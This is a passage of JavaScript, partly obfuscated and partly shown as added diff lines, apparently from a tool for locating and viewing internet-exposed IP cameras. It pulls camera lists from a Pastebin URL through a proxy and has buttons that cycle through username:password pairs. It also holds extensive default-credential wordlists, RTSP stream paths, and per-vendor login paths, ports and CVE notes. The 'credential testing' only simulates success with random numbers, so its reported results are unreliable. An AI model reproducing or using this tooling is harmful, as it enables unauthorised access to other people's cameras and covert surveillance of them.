_0x12ea3c=document[_0x132b08(0x21c)]('td'),_0x4cba2a=document[_0x132b08(0x21c)](_0x132b08(0x239));_0x4cba2a[_0x132b08(0x259)]='credential-action-btn',_0x4cba2a[_0x132b08(0x2af)]=_0x132b08(0x2df),_0x4cba2a['title']=_0x132b08(0x29a),_0x4cba2a['addEventListener'](_0x132b08(0x2bd),()=>{testSingleCredential(_0x54b081,_0x2f3ffd,_0xb9cc05);});const _0x4a5175=document[_0x132b08(0x21c)](_0x132b08(0x239));_0x4a5175[_0x132b08(0x259)]=_0x132b08(0x14d),_0x4a5175[_0x132b08(0x2af)]=_0x132b08(0x350),_0x4a5175['title']='Copy\x20credential',_0x4a5175[_0x132b08(0x28f)](_0x132b08(0x2bd),()=>{const _0x28dba2=_0x132b08;copyToClipboard(_0xb9cc05[_0x28dba2(0x382)]+':'+_0xb9cc05[_0x28dba2(0x2ad)]),showNotification(_0x28dba2(0x21e));}),_0x12ea3c[_0x132b08(0x301)](_0x4cba2a),_0x12ea3c['appendChild'](_0x4a5175),_0x4e2084[_0x132b08(0x301)](_0x3a16bf),_0x4e2084[_0x132b08(0x301)](_0x3557d3),_0x4e2084[_0x132b08(0x301)](_0x398f1a),_0x4e2084['appendChild'](_0x12ea3c),_0x423f9a['appendChild'](_0x4e2084);}),_0xd6f44f&&(_0xd6f44f[_0x27e919(0x16d)]=![],_0xd6f44f[_0x27e919(0x28f)](_0x27e919(0x2bd),()=>{testAllCredentials(_0x54b081,_0x2f3ffd);}));else{const _0x525a9c=document[_0x27e919(0x21c)]('tr'),_0x1b44aa=document[_0x27e919(0x21c)]('td');_0x1b44aa[_0x27e919(0x2f4)]=0x4,_0x1b44aa[_0x27e919(0x43f)]=_0x27e919(0x199),_0x1b44aa[_0x27e919(0x270)]['textAlign']=_0x27e919(0x423),_0x1b44aa[_0x27e919(0x270)][_0x27e919(0x145)]=_0x27e919(0x3cf),_0x525a9c[_0x27e919(0x301)](_0x1b44aa),_0x423f9a[_0x27e919(0x301)](_0x525a9c),_0xd6f44f&&(_0xd6f44f[_0x27e919(0x16d)]=!![]);}const _0x159f40=_0x54b081[_0x27e919(0x3b0)](_0x27e919(0x3b6)),_0x1292aa=_0x54b081[_0x27e919(0x3b0)](_0x27e919(0x1ce));_0x159f40&&_0x1292aa&&_0x159f40[_0x27e919(0x28f)]('click',()=>{const _0x5d7e9a=_0x27e919,_0x3e8206=_0x1292aa[_0x5d7e9a(0x270)]['display']===_0x5d7e9a(0x3b1);_0x1292aa[_0x5d7e9a(0x270)][_0x5d7e9a(0x252)]=_0x3e8206?_0x5d7e9a(0x332):_0x5d7e9a(0x3b1),_0x159f40['innerHTML']=_0x3e8206?_0x5d7e9a(0x3c9):_0x5d7e9a(0x1c4);});},updateVulnerabilitiesSection=(_0x383138,_0x5a7144)=>{const _0x302e2c=_0x5d7fa7;if(!_0x383138||!_0x5a7144)return;const _0xb9de38=_0x383138[_0x302e2c(0x3b0)](_0x302e2c(0x434)),_0x2e9534=_0x383138[_0x302e2c(0x3b0)](_0x302e2c(0x179));if(!_0xb9de38||!_0x2e9534)return;const _0x4bd125=_0x5a7144[_0x302e2c(0x1a4)][_0x302e2c(0x484)]||[];_0xb9de38[_0x302e2c(0x43f)]=_0x4bd125[_0x302e2c(0x326)],_0x2e9534['innerHTML']='';if(_0x4bd125[_0x302e2c(0x326)]>0x0)_0x4bd125[_0x302e2c(0x222)](_0x1f3726=>{const _0x10e664=_0x302e2c,_0x3ff950=document[_0x10e664(0x21c)]('li');_0x3ff950[_0x10e664(0x43f)]=_0x1f3726,_0x2e9534[_0x10e664(0x301)](_0x3ff950);});else{const _0x127fea=document[_0x302e2c(0x21c)]('li');_0x127fea[_0x302e2c(0x43f)]=_0x302e2c(0x269),_0x127fea[_0x302e2c(0x270)]['backgroundColor']='rgba(16,\x20185,\x20129,\x200.1)',_0x127fea[_0x302e2c(0x270)][_0x302e2c(0x40b)]='var(--success-color)',_0x2e9534['appendChild'](_0x127fea);}const _0x15d032=_0x383138[_0x302e2c(0x3b0)](_0x302e2c(0x280)),_0x6d4c1=_0x383138[_0x302e2c(0x3b0)](_0x302e2c(0x1c8));_0x15d032&&_0x6d4c1&&_0x15d032[_0x302e2c(0x28f)](_0x302e2c(0x2bd),()=>{const _0x469a56=_0x302e2c,_0x573982=_0x6d4c1[_0x469a56(0x270)]['display']===_0x469a56(0x3b1);_0x6d4c1[_0x469a56(0x270)]['display']=_0x573982?_0x469a56(0x332):_0x469a56(0x3b1),_0x15d032[_0x469a56(0x2af)]=_0x573982?_0x469a56(0x3c9):_0x469a56(0x1c4);});},copyToClipboard=_0x37525c=>{const _0x13664f=_0x5d7fa7,_0x1e181c=document['createElement']('textarea');_0x1e181c[_0x13664f(0x1a5)]=_0x37525c,_0x1e181c['style'][_0x13664f(0x3bd)]=_0x13664f(0x442),_0x1e181c[_0x13664f(0x270)][_0x13664f(0x232)]=0x0,document[_0x13664f(0x27f)][_0x13664f(0x301)](_0x1e181c),_0x1e181c[_0x13664f(0x348)](),document[_0x13664f(0x2fd)]('copy'),document[_0x13664f(0x27f)][_0x13664f(0x1fe)](_0x1e181c);},testSingleCredential=(_0x23e5f8,_0x266345,_0x31cd4a)=>{const _0x364e24=_0x5d7fa7;if(!_0x23e5f8||!_0x266345||!_0x31cd4a)return;const _0x1be599=_0x23e5f8[_0x364e24(0x3b0)]('.test-results'),_0xf03491=_0x23e5f8[_0x364e24(0x3b0)](_0x364e24(0x489));if(!_0x1be599||!_0xf03491)return;_0x1be599['style'][_0x364e24(0x252)]=_0x364e24(0x332);const _0x32a882=document[_0x364e24(0x21c)](_0x364e24(0x1df));_0x32a882[_0x364e24(0x259)]=_0x364e24(0x3ed),_0x32a882[_0x364e24(0x2af)]='<i\x20class=\x22fas\x20fa-spinner\x20fa-spin\x22></i>\x20Testing\x20'+_0x31cd4a[_0x364e24(0x382)]+':'+_0x31cd4a[_0x364e24(0x2ad)]+_0x364e24(0x30b),_0xf03491['prepend'](_0x32a882),setTimeout(()=>{const _0x31e9da=_0x364e24,_0x390136=Math[_0x31e9da(0x35c)]()>0.7;_0x390136?(_0x32a882[_0x31e9da(0x259)]='test-result-item\x20test-result-success',_0x32a882[_0x31e9da(0x2af)]=_0x31e9da(0x31a)+_0x31cd4a[_0x31e9da(0x382)]+':'+_0x31cd4a[_0x31e9da(0x2ad)]+_0x31e9da(0x344),showNotification(_0x31e9da(0x1f3),_0x31e9da(0x353))):(_0x32a882[_0x31e9da(0x259)]=_0x31e9da(0x265),_0x32a882[_0x31e9da(0x2af)]='<i\x20class=\x22fas\x20fa-times-circle\x22></i>\x20<strong>'+_0x31cd4a[_0x31e9da(0x382)]+':'+_0x31cd4a[_0x31e9da(0x2ad)]+_0x31e9da(0x341));},0x5dc);},testAllCredentials=(_0x2b7192,_0x15237f)=>{const _0x53af0a=_0x5d7fa7;if(!_0x2b7192||!_0x15237f)return;const _0x883c7e=_0x15237f['authInfo'][_0x53af0a(0x362)];if(!_0x883c7e||_0x883c7e[_0x53af0a(0x326)]===0x0)return;const _0x4d45ea=_0x2b7192[_0x53af0a(0x3b0)](_0x53af0a(0x3e3)),_0x1618d8=_0x2b7192['querySelector'](_0x53af0a(0x394)),_0x1ffc61=_0x2b7192[_0x53af0a(0x3b0)](_0x53af0a(0x30c)),_0x85b02=_0x2b7192[_0x53af0a(0x3b0)]('.test-results'),_0x3b276a=_0x2b7192[_0x53af0a(0x3b0)](_0x53af0a(0x489));if(!_0x4d45ea||!_0x1618d8||!_0x1ffc61||!_0x85b02||!_0x3b276a)return;_0x4d45ea[_0x53af0a(0x270)][_0x53af0a(0x252)]=_0x53af0a(0x332),_0x85b02[_0x53af0a(0x270)][_0x53af0a(0x252)]='block',_0x3b276a['innerHTML']='';const _0x233ff9=document[_0x53af0a(0x21c)](_0x53af0a(0x1df));_0x233ff9['style'][_0x53af0a(0x47a)]=_0x53af0a(0x474),_0x233ff9[_0x53af0a(0x270)][_0x53af0a(0x3f6)]=_0x53af0a(0x1e4),_0x233ff9['innerHTML']='<i\x20class=\x22fas\x20fa-clock\x22></i>\x20Test\x20started\x20at\x20'+new Date()[_0x53af0a(0x388)](),_0x3b276a['appendChild'](_0x233ff9);let _0x5af9e7=0x0;const _0x501a5a=_0x883c7e[_0x53af0a(0x326)];_0x1ffc61[_0x53af0a(0x43f)]=_0x53af0a(0x48f)+_0x501a5a+')';const _0xb63fe0=()=>{const _0x49b60f=_0x53af0a;if(_0x5af9e7>=_0x501a5a){_0x1ffc61[_0x49b60f(0x43f)]=_0x49b60f(0x2f9)+_0x501a5a+'/'+_0x501a5a+')',showNotification(_0x49b60f(0x1b5),_0x49b60f(0x353));return;}const _0x4c6dac=_0x883c7e[_0x5af9e7],_0x2eaf1e=(_0x5af9e7+0x1)/_0x501a5a*0x64;_0x1618d8[_0x49b60f(0x270)]['width']=_0x2eaf1e+'%',_0x1ffc61[_0x49b60f(0x43f)]=_0x49b60f(0x17d)+(_0x5af9e7+0x1)+'/'+_0x501a5a+')';const _0x42d7ba=document[_0x49b60f(0x21c)](_0x49b60f(0x1df));_0x42d7ba['className']=_0x49b60f(0x3ed),_0x42d7ba[_0x49b60f(0x2af)]=_0x49b60f(0x291)+_0x4c6dac[_0x49b60f(0x382)]+':'+_0x4c6dac[_0x49b60f(0x2ad)]+'...',_0x3b276a[_0x49b60f(0x301)](_0x42d7ba),_0x3b276a[_0x49b60f(0x377)]=_0x3b276a[_0x49b60f(0x194)],setTimeout(()=>{const _0x1172b6=_0x49b60f,_0x34f167=Math[_0x1172b6(0x35c)]()>0.7;_0x34f167?(_0x42d7ba[_0x1172b6(0x259)]=_0x1172b6(0x46b),_0x42d7ba[_0x1172b6(0x2af)]=_0x1172b6(0x31a)+_0x4c6dac[_0x1172b6(0x382)]+':'+_0x4c6dac[_0x1172b6(0x2ad)]+'</strong>\x20-\x20Authentication\x20successful!'):(_0x42d7ba[_0x1172b6(0x259)]=_0x1172b6(0x265),_0x42d7ba[_0x1172b6(0x2af)]=_0x1172b6(0x402)+_0x4c6dac[_0x1172b6(0x382)]+':'+_0x4c6dac[_0x1172b6(0x2ad)]+_0x1172b6(0x341)),_0x5af9e7++,_0xb63fe0();},0x3e8);};_0xb63fe0();},init=()=>{const _0x485bb3=_0x5d7fa7;try{DOM['init']();const _0x489e00=DOM[_0x485bb3(0x165)](_0x485bb3(0x1a9)),_0x12f670=_0x489e00?.[_0x485bb3(0x3b0)]('.window-titlebar');_0x489e00&&_0x12f670?(makeDraggable(_0x489e00,_0x12f670),setupWindowControls(_0x489e00)):console[_0x485bb3(0x161)](_0x485bb3(0x13b));updateCameraCount(),updateClock();const _0x4f266a=setInterval(updateClock,0xea60);updateCameraListFromPastebin(API_ENDPOINTS['PASTEBIN'])[_0x485bb3(0x46d)](_0x1a21e2=>{const _0x4dec2c=_0x485bb3;console[_0x4dec2c(0x473)](_0x4dec2c(0x493),_0x1a21e2),showNotification(_0x4dec2c(0x19f),'error');});const _0x198d43=DOM[_0x485bb3(0x165)](_0x485bb3(0x26c));_0x198d43&&_0x198d43[_0x485bb3(0x28f)](_0x485bb3(0x2bd),openAdvancedDashboard);removeOverlay();const _0x5f2b8b=new MutationObserver(()=>{removeOverlay();});_0x5f2b8b['observe'](document[_0x485bb3(0x27f)],{'childList':!![],'subtree':!![]});const _0x7941ec=()=>{const _0x3359e8=_0x485bb3;clearInterval(_0x4f266a),_0x5f2b8b[_0x3359e8(0x20c)](),Object['values'](globalState[_0x3359e8(0x43c)])[_0x3359e8(0x222)](_0xd6f6f=>{const _0x5928f5=_0x3359e8;if(_0xd6f6f['observer'])_0xd6f6f[_0x5928f5(0x1af)]['disconnect']();if(_0xd6f6f[_0x5928f5(0x4a5)])clearTimeout(_0xd6f6f[_0x5928f5(0x4a5)]);}),globalState[_0x3359e8(0x43c)]={};};return window[_0x485bb3(0x28f)](_0x485bb3(0x17a),_0x7941ec),console['info'](_0x485bb3(0x392)),!![];}catch(_0x807e39){return console['error'](_0x485bb3(0x397),_0x807e39),![];}};document['readyState']==='loading'?document[_0x5d7fa7(0x28f)](_0x5d7fa7(0x1f8),init):init();window['openTab']=openTab,window[_0x5d7fa7(0x189)]=closeVideoWindow;function openTab(_0x573a75,_0x4755da){const _0x262ce1=_0x5d7fa7,_0x5537e4=document[_0x262ce1(0x46c)](_0x262ce1(0x1d3));for(let _0x56407c=0x0;_0x56407c<_0x5537e4[_0x262ce1(0x326)];_0x56407c++){_0x5537e4[_0x56407c]['style'][_0x262ce1(0x252)]=_0x262ce1(0x3b1);}const _0x4a553f=document['getElementsByClassName'](_0x262ce1(0x1f1));for(let _0x105649=0x0;_0x105649<_0x4a553f[_0x262ce1(0x326)];_0x105649++){_0x4a553f[_0x105649][_0x262ce1(0x259)]=_0x4a553f[_0x105649][_0x262ce1(0x259)]['replace'](_0x262ce1(0x264),'');}document[_0x262ce1(0x1e8)](_0x4755da)['style'][_0x262ce1(0x252)]=_0x262ce1(0x332),_0x573a75[_0x262ce1(0x331)][_0x262ce1(0x259)]+=_0x262ce1(0x264);}const setupMetadataExtraction=_0x51a110=>{const _0x3c3e80=_0x5d7fa7;console[_0x3c3e80(0x401)](_0x3c3e80(0x480),_0x51a110);if(!_0x51a110){console[_0x3c3e80(0x473)](_0x3c3e80(0x1fb));return;}const _0xee7149=_0x51a110[_0x3c3e80(0x3b0)](_0x3c3e80(0x2d7));console[_0x3c3e80(0x401)](_0x3c3e80(0x339),_0xee7149);if(!_0xee7149){console[_0x3c3e80(0x473)](_0x3c3e80(0x135));return;}const _0x2d36a1=_0xee7149[_0x3c3e80(0x2e2)](!![]);_0xee7149[_0x3c3e80(0x3bf)]['replaceChild'](_0x2d36a1,_0xee7149),_0x2d36a1['addEventListener'](_0x3c3e80(0x2bd),_0x4b7e7c=>{const _0x3bea14=_0x3c3e80;_0x4b7e7c[_0x3bea14(0x345)](),console[_0x3bea14(0x401)]('[setupMetadataExtraction]\x20Extract\x20metadata\x20button\x20clicked');const _0x22949b=_0x51a110[_0x3bea14(0x3b0)](_0x3bea14(0x319));_0x22949b&&(_0x22949b['style'][_0x3bea14(0x252)]=_0x3bea14(0x31e));try{console[_0x3bea14(0x401)](_0x3bea14(0x41b));const _0x1129d0=extractCameraMetadata(_0x51a110);console[_0x3bea14(0x401)](_0x3bea14(0x210),_0x1129d0),_0x1129d0[_0x3bea14(0x353)]?showNotification(_0x3bea14(0x1e7),_0x3bea14(0x353)):showNotification('Metadata\x20extraction\x20failed:\x20'+_0x1129d0[_0x3bea14(0x473)],_0x3bea14(0x473));}catch(_0x4faa8e){console[_0x3bea14(0x473)](_0x3bea14(0x14b),_0x4faa8e),showNotification(_0x3bea14(0x3af)+_0x4faa8e[_0x3bea14(0x209)],_0x3bea14(0x473));}finally{_0x22949b&&(_0x22949b[_0x3bea14(0x270)][_0x3bea14(0x252)]=_0x3bea14(0x3b1));}}),console['log'](_0x3c3e80(0x313));};
+// Constants
+const API_ENDPOINTS = {
+    IP_INFO: 'http://ip-api.com/json/',
+    IP_INFO_FIELDS: 'status,message,continent,continentCode,country,countryCode,region,regionName,city,district,zip,lat,lon,timezone,offset,currency,isp,org,as,asname,reverse,mobile,proxy,hosting,query',
+    PASTEBIN: 'https://pastebin.com/raw/UuJZFNxF',
+    CORS_PROXY: 'https://serverless-api-jnzf.vercel.app/api/proxy',
+    ASN_INFO: 'https://ipinfo.io/',
+    CAMERA_METADATA: 'https://serverless-api-jnzf.vercel.app/api/proxy'
+};
+
+// State
+let globalState = {
+    latitude: null,
+    longitude: null,
+    asn: null,
+    cameras: [],
+    activeWindows: [],
+    resizeObservers: {},
+    advancedMode: false,
+    rawData: {
+        ipInfo: {},
+        asnInfo: {},
+        metadata: {}
+    },
+    consoleLog: [],
+    currentSelectedCamera: null,
+    autoResolution: true,
+    manualResolution: "720x420",
+    playerPreference: "flashphoner",
+    mjpgPlayerPreference: "mjpg-iframe",
+    // Comprehensive credential database
+    credentialDatabase: {
+        usernames: [
+            "",
+            "666666",
+            "888888",
+            "Admin",
+            "admin",
+            "admin1",
+            "administrator",
+            "Administrator",
+            "aiphone",
+            "Dinion",
+            "none",
+            "root",
+            "Root",
+            "service",
+            "supervisor",
+            "ubnt"
+        ],
+        passwords: [
+            "",
+            "0000",
+            "00000",
+            "1111",
+            "111111",
+            "1111111",
+            "123",
+            "1234",
+            "12345",
+            "123456",
+            "1234567",
+            "12345678",
+            "123456789",
+            "12345678910",
+            "4321",
+            "666666",
+            "6fJjMKYx",
+            "888888",
+            "9999",
+            "admin",
+            "admin123456",
+            "admin pass",
+            "Admin",
+            "admin123",
+            "administrator",
+            "Administrator",
+            "aiphone",
+            "camera",
+            "Camera",
+            "fliradmin",
+            "GRwvcj8j",
+            "hikvision",
+            "hikadmin",
+            "HuaWei123",
+            "ikwd",
+            "jvc",
+            "kj3TqCWv",
+            "meinsm",
+            "pass",
+            "Pass",
+            "password",
+            "password123",
+            "qwerty",
+            "qwerty123",
+            "Recorder",
+            "reolink",
+            "root",
+            "service",
+            "supervisor",
+            "support",
+            "system",
+            "tlJwpbo6",
+            "toor",
+            "tp-link",
+            "ubnt",
+            "user",
+            "wbox",
+            "wbox123",
+            "Y5eIMz3C"
+        ]
+    },
+    // Common RTSP stream paths
+    rtspPaths: [
+        "/live/ch01_0",
+        "0/1:1/main",
+        "0/usrnm:pwd/main",
+        "0/video1",
+        "1",
+        "1.AMP",
+        "1/h264major",
+        "1/stream1",
+        "11",
+        "12",
+        "125",
+        "1080p",
+        "1440p",
+        "480p",
+        "4K",
+        "666",
+        "720p",
+        "AVStream1_1",
+        "CAM_ID.password.mp2",
+        "CH001.sdp",
+        "GetData.cgi",
+        "HD",
+        "HighResolutionVideo",
+        "LowResolutionVideo",
+        "MediaInput/h264",
+        "MediaInput/mpeg4",
+        "ONVIF/MediaInput",
+        "ONVIF/MediaInput?profile=4_def_profile6",
+        "StdCh1",
+        "Streaming/Channels/1",
+        "Streaming/Unicast/channels/101",
+        "StreamingSetting?version=1.0&action=getRTSPStream&ChannelID=1&ChannelName=Channel1",
+        "VideoInput/1/h264/1",
+        "VideoInput/1/mpeg4/1",
+        "access_code",
+        "access_name_for_stream_1_to_5",
+        "api/mjpegvideo.cgi",
+        "av0_0",
+        "av2",
+        "avc",
+        "avn=2",
+        "axis-media/media.amp",
+        "axis-media/media.amp?camera=1",
+        "axis-media/media.amp?videocodec=h264",
+        "cam",
+        "cam/realmonitor",
+        "cam/realmonitor?channel=0&subtype=0",
+        "cam/realmonitor?channel=1&subtype=0",
+        "cam/realmonitor?channel=1&subtype=1",
+        "cam/realmonitor?channel=1&subtype=1&unicast=true&proto=Onvif",
+        "cam0",
+        "cam0_0",
+        "cam0_1",
+        "cam1",
+        "cam1/h264",
+        "cam1/h264/multicast",
+        "cam1/mjpeg",
+        "cam1/mpeg4",
+        "cam1/mpeg4?user='username'&pwd='password'",
+        "cam1/onvif-h264",
+        "camera.stm",
+        "ch0",
+        "ch00/0",
+        "ch001.sdp",
+        "ch01.264",
+        "ch01.264?",
+        "ch01.264?ptype=tcp",
+        "ch1_0",
+        "ch2_0",
+        "ch3_0",
+        "ch4_0",
+        "ch1/0",
+        "ch2/0",
+        "ch3/0",
+        "ch4/0",
+        "ch0_0.h264",
+        "ch0_unicast_firststream",
+        "ch0_unicast_secondstream",
+        "ch1-s1",
+        "channel1",
+        "gnz_media/main",
+        "h264",
+        "h264.sdp",
+        "h264/ch1/sub/av_stream",
+        "h264/media.amp",
+        "h264Preview_01_main",
+        "h264Preview_01_sub",
+        "h264_vga.sdp",
+        "h264_stream",
+        "image.mpg",
+        "img/media.sav",
+        "img/media.sav?channel=1",
+        "img/video.asf",
+        "img/video.sav",
+        "ioImage/1",
+        "ipcam.sdp",
+        "ipcam_h264.sdp",
+        "ipcam_mjpeg.sdp",
+        "live",
+        "live.sdp",
+        "live/av0",
+        "live/ch0",
+        "live/ch00_0",
+        "live/ch01_0",
+        "live/h264",
+        "live/main",
+        "live/main0",
+        "live/mpeg4",
+        "live1.sdp",
+        "live3.sdp",
+        "live_mpeg4.sdp",
+        "live_st1",
+        "livestream",
+        "main",
+        "media",
+        "media.amp",
+        "media.amp?streamprofile=Profile1",
+        "media/media.amp",
+        "media/video1",
+        "medias2",
+        "mjpeg/media.smp",
+        "mp4",
+        "mpeg/media.amp",
+        "mpeg4",
+        "mpeg4/1/media.amp",
+        "mpeg4/media.amp",
+        "mpeg4/media.smp",
+        "mpeg4unicast",
+        "mpg4/rtsp.amp",
+        "multicaststream",
+        "now.mp4",
+        "nph-h264.cgi",
+        "nphMpeg4/g726-640x",
+        "nphMpeg4/g726-640x48",
+        "nphMpeg4/g726-640x480",
+        "nphMpeg4/nil-320x240",
+        "onvif-media/media.amp",
+        "onvif1",
+        "pass@10.0.0.5:6667/blinkhd",
+        "play1.sdp",
+        "play2.sdp",
+        "profile0",
+        "profile1",
+        "profile2",
+        "profile2/media.smp",
+        "profile5/media.smp",
+        "rtpvideo1.sdp",
+        "rtsp_live0",
+        "rtsp_live1",
+        "rtsp_live2",
+        "rtsp_tunnel",
+        "rtsph264",
+        "rtsph2641080p",
+        "snap.jpg",
+        "stream",
+        "stream/0",
+        "stream/1",
+        "stream/live.sdp",
+        "stream.sdp",
+        "stream1",
+        "streaming/channels/0",
+        "streaming/channels/1",
+        "streaming/channels/101",
+        "tcp/av0_0",
+        "test",
+        "tmpfs/auto.jpg",
+        "trackID=1",
+        "ucast/11",
+        "udp/av0_0",
+        "udp/unicast/aiphone_H264",
+        "udpstream",
+        "user.pin.mp2",
+        "user=admin&password=&channel=1&stream=0.sdp?",
+        "user=admin&password=&channel=1&stream=0.sdp?real_stream",
+        "user=admin_password=?????_channel=1_stream=0.sdp?real_stream",
+        "user=admin_password=R5XFY888_channel=1_stream=0.sdp?real_stream",
+        "user_defined",
+        "v2",
+        "video",
+        "video.3gp",
+        "video.h264",
+        "video.mjpg",
+        "video.mp4",
+        "video.pro1",
+        "video.pro2",
+        "video.pro3",
+        "video0",
+        "video0.sdp",
+        "video1",
+        "video1.sdp",
+        "video1+audio1",
+        "videoMain",
+        "videoinput_1/h264_1/media.stm",
+        "videostream.asf",
+        "vis",
+        "wfov"
+    ],
+    cameraModels: {
+        // Common camera manufacturers and their identifiers
+        hikvision: {
+            patterns: ['hikvision', 'hikconnect', 'hik-connect', 'ivms', 'ds-'],
+            defaultCredentials: [
+                { username: 'admin', password: '12345', notes: 'Factory default' },
+                { username: 'admin', password: 'admin', notes: 'Common default' },
+                { username: 'admin', password: 'Admin12345', notes: 'Updated default since 2016' },
+                { username: 'admin', password: '', notes: 'Blank password on some models' },
+                { username: 'admin', password: '123456', notes: 'Common variation' },
+                { username: 'admin', password: 'hikvision', notes: 'Brand name as password' },
+                { username: 'operator', password: 'operator', notes: 'Secondary account' }
+            ],
+            webPaths: ['/doc/page/login.asp', '/PSIA/Custom/SelfExt/userCheck', '/ISAPI/Security/userCheck'],
+            ports: [80, 443, 554, 8000, 8200],
+            securityRating: 'medium',
+            vulnerabilities: [
+                'CVE-2021-36260: Command injection via web interface',
+                'CVE-2017-7921: Authentication bypass in older firmware'
+            ]
+        },
+        dahua: {
+            patterns: ['dahua', 'dh-', 'ipc-h', 'ipc-d', 'lechange'],
+            defaultCredentials: [
+                { username: 'admin', password: 'admin', notes: 'Factory default' },
+                { username: 'admin', password: 'Admin123', notes: 'Updated default' },
+                { username: 'admin', password: 'password', notes: 'Common variation' },
+                { username: '888888', password: '888888', notes: 'Secondary admin account' },
+                { username: '666666', password: '666666', notes: 'Operator account' },
+                { username: 'default', password: 'default', notes: 'Backup account on some models' },
+                { username: 'root', password: 'vizxv', notes: 'Telnet/SSH access on older models' }
+            ],
+            webPaths: ['/RPC2_Login', '/RPC2', '/cgi-bin/configManager.cgi'],
+            ports: [80, 443, 554, 37777],
+            securityRating: 'medium',
+            vulnerabilities: [
+                'CVE-2021-33044: Authentication bypass in some models',
+                'CVE-2013-6117: Unauthenticated access to device configuration'
+            ]
+        },
+        axis: {
+            patterns: ['axis', 'accc', 'vapix'],
+            defaultCredentials: [
+                { username: 'root', password: 'pass', notes: 'Factory default' },
+                { username: 'admin', password: 'admin', notes: 'Common default' },
+                { username: 'root', password: 'root', notes: 'Alternative default' },
+                { username: 'admin', password: 'axis2022', notes: 'Newer models default' },
+                { username: 'viewer', password: 'viewer', notes: 'View-only account' }
+            ],
+            webPaths: ['/axis-cgi/admin/param.cgi', '/view/index.shtml', '/axis-cgi/jpg/image.cgi'],
+            ports: [80, 443, 554],
+            securityRating: 'high',
+            vulnerabilities: [
+                'CVE-2018-10660: Command injection in older firmware'
+            ]
+        },
+        foscam: {
+            patterns: ['foscam', 'fi9', 'r2', 'c1', 'c2'],
+            defaultCredentials: [
+                { username: 'admin', password: 'admin', notes: 'Factory default' },
+                { username: 'admin', password: '', notes: 'Blank password on some models' },
+                { username: 'admin', password: 'password', notes: 'Common variation' },
+                { username: 'admin', password: 'foscam', notes: 'Brand name as password' },
+                { username: 'visitor', password: 'visitor', notes: 'Guest account' }
+            ],
+            webPaths: ['/cgi-bin/CGIProxy.fcgi', '/cgi-bin/viewer/video.jpg', '/videostream.cgi'],
+            ports: [80, 443, 554, 88, 10080],
+            securityRating: 'low',
+            vulnerabilities: [
+                'CVE-2018-19355: Authentication bypass',
+                'CVE-2020-9047: Hard-coded credentials',
+                'Multiple unauthenticated RCE vulnerabilities'
+            ]
+        },
+        tplink: {
+            patterns: ['tplink', 'tp-link', 'tapo'],
+            defaultCredentials: [
+                { username: 'admin', password: 'admin', notes: 'Factory default' },
+                { username: 'admin', password: 'password', notes: 'Common variation' },
+                { username: 'admin', password: 'tp-link', notes: 'Brand name as password' },
+                { username: 'admin', password: 'tplink', notes: 'Brand name variation' }
+            ],
+            webPaths: ['/webpages/index.html', '/cgi/index.cgi', '/cgi-bin/luci'],
+            ports: [80, 443, 554, 2020],
+            securityRating: 'medium',
+            vulnerabilities: [
+                'CVE-2020-35575: Remote code execution in Tapo cameras',
+                'CVE-2021-41653: Information disclosure'
+            ]
+        },
+        wyze: {
+            patterns: ['wyze', 'wyzecam'],
+            defaultCredentials: [
+                { username: 'admin', password: 'admin123', notes: 'Factory default' },
+                { username: 'admin', password: 'admin1234', notes: 'Common variation' }
+            ],
+            webPaths: ['/cgi-bin/api.cgi', '/live'],
+            ports: [80, 443, 554],
+            securityRating: 'medium',
+            vulnerabilities: [
+                'CVE-2019-9569: Information disclosure',
+                'CVE-2019-12266: Buffer overflow'
+            ]
+        },
+        reolink: {
+            patterns: ['reolink', 'rlc-'],
+            defaultCredentials: [
+                { username: 'admin', password: 'admin', notes: 'Factory default' },
+                { username: 'admin', password: '', notes: 'Blank password on some models' },
+                { username: 'admin', password: 'reolink', notes: 'Brand name as password' },
+                { username: 'admin', password: 'Reolink123', notes: 'Updated default on newer models' },
+                { username: 'guest', password: 'guest', notes: 'Guest account' }
+            ],
+            webPaths: ['/cgi-bin/api.cgi', '/api/v1/device', '/cgi-bin/ptz.cgi'],
+            ports: [80, 443, 554, 9000],
+            securityRating: 'medium',
+            vulnerabilities: [
+                'CVE-2020-25169: Hard-coded credentials',
+                'CVE-2020-25173: Command injection'
+            ]
+        },
+        amcrest: {
+            patterns: ['amcrest', 'ipc-'],
+            defaultCredentials: [
+                { username: 'admin', password: 'admin', notes: 'Factory default' },
+                { username: 'admin', password: 'password', notes: 'Common variation' },
+                { username: 'admin', password: 'amcrest', notes: 'Brand name as password' },
+                { username: 'admin', password: 'admin123', notes: 'Common variation' }
+            ],
+            webPaths: ['/cgi-bin/snapshot.cgi', '/cgi-bin/configManager.cgi'],
+            ports: [80, 443, 554],
+            securityRating: 'medium',
+            vulnerabilities: [
+                'CVE-2017-8229: Authentication bypass',
+                'CVE-2019-3948: Unauthorized access'
+            ]
+        },
+        ubiquiti: {
+            patterns: ['ubiquiti', 'unifi', 'aircam', 'uvc'],
+            defaultCredentials: [
+                { username: 'ubnt', password: 'ubnt', notes: 'Factory default' },
+                { username: 'admin', password: 'admin', notes: 'Alternative default' },
+                { username: 'root', password: 'ubnt', notes: 'SSH/Telnet default' }
+            ],
+            webPaths: ['/api/2.0/login', '/login', '/manage/account/login'],
+            ports: [80, 443, 554, 7080, 7443],
+            securityRating: 'medium',
+            vulnerabilities: [
+                'CVE-2021-22909: Improper access control',
+                'CVE-2019-11344: Command injection'
+            ]
+        },
+        vivotek: {
+            patterns: ['vivotek', 'vvtk'],
+            defaultCredentials: [
+                { username: 'root', password: 'root', notes: 'Factory default' },
+                { username: 'admin', password: 'admin', notes: 'Common default' },
+                { username: 'vivotek', password: 'vivotek', notes: 'Brand name credentials' }
+            ],
+            webPaths: ['/cgi-bin/viewer/video.jpg', '/cgi-bin/admin/getparam.cgi'],
+            ports: [80, 443, 554, 3702],
+            securityRating: 'medium',
+            vulnerabilities: [
+                'CVE-2020-5722: Command injection',
+                'CVE-2018-13878: Authentication bypass'
+            ]
+        },
+        generic: {
+            patterns: ['ipcam', 'netcam', 'webcam', 'ip camera', 'rtsp'],
+            defaultCredentials: [
+                { username: 'admin', password: 'admin', notes: 'Most common default' },
+                { username: 'admin', password: 'password', notes: 'Very common default' },
+                { username: 'admin', password: '1234', notes: 'Simple numeric password' },
+                { username: 'admin', password: '12345', notes: 'Simple numeric password' },
+                { username: 'admin', password: '', notes: 'Blank password' },
+                { username: 'root', password: 'root', notes: 'Common for embedded systems' },
+                { username: 'user', password: 'user', notes: 'Simple user account' },
+                { username: 'guest', password: 'guest', notes: 'Guest account' }
+            ],
+            webPaths: ['/index.html', '/login.html', '/cgi-bin/snapshot.cgi'],
+            ports: [80, 443, 554, 8080, 8000],
